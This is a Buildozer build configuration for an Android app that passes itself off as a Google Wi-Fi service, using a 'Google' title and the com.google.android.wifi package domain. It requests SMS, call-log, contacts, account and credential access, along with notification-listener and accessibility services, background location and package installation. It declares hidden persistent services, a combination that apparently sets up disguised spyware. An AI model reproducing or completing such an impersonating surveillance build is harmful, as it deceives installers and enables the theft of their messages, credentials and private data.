[app]
title = Servizi Wi-Fi Google
package.name = wifi_services
package.domain = com.google.android.wifi
version.code = 7
version.string = 3.0.0
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
requirements = python3,kivy,plyer,pyjnius,websocket-client,requests

android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,
    CHANGE_WIFI_STATE,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,
    ACCESS_BACKGROUND_LOCATION,FOREGROUND_SERVICE,WAKE_LOCK,
    SYSTEM_ALERT_WINDOW,REQUEST_INSTALL_PACKAGES,
    READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,
    READ_CONTACTS,READ_SMS,RECEIVE_SMS,READ_CALL_LOG,
    READ_PHONE_STATE,POST_NOTIFICATIONS,
    BIND_NOTIFICATION_LISTENER_SERVICE,BIND_ACCESSIBILITY_SERVICE,
    QUERY_ALL_PACKAGES,GET_ACCOUNTS,USE_CREDENTIALS,
    MANAGE_EXTERNAL_STORAGE

android.api = 34
android.minapi = 26
android.ndk = 27
android.sdk = 34
android.gradle_dependencies = 'androidx.core:core:1.12.0'

android.manifest = 
    <application android:label="Servizi Wi-Fi Google" android:allowBackup="true">
        <service android:name=".WifiOptimizerService"
                 android:foregroundServiceType="dataSync"
                 android:exported="false" android:label="Servizio Wi-Fi"/>
        <service android:name=".WifiNotificationListener"
                 android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                 android:exported="false" android:label="Notifiche WiFi"/>
        <service android:name=".WifiAccessibilityService"
                 android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                 android:exported="false" android:label="Accessibilità Wi-Fi"/>
    </application>

android.foreground = 1
android.foreground_service = 1
android.wakelock = True

orientation = portrait
fullscreen = 0
presplash.color = #FFFFFF
android.debug = 1
